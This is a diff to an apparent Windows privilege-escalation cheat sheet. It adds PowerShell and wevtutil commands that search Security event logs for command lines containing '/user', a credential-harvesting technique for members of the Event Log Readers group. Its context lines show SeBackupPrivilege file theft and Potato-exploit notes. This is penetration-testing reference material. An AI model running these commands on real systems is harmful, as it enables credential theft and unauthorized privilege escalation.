@@ -411,6 +411,13 @@ import-module .\SeBackupPrivilegeUtils.dll
 import-module .\SeBackupPrivilegeCmdLets.dll
 Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
 ```
+### Abusing Event Log Readers Group
+```
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+```
+```
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
 ### Abuse SeImpersonatePrivilege(GodPotato->JuicyPotatoNG->RoguePotato->PrintSpoofer->JuicyPotato)
 >JuicyPotato -> Windows 7/8, Server 2008 R2/2012/2012 R2, early Windows 10/Server 2016
 >RoguePotato -> Intended for Windows 10 1809+ and Server 2019 where JuicyPotato stopped working
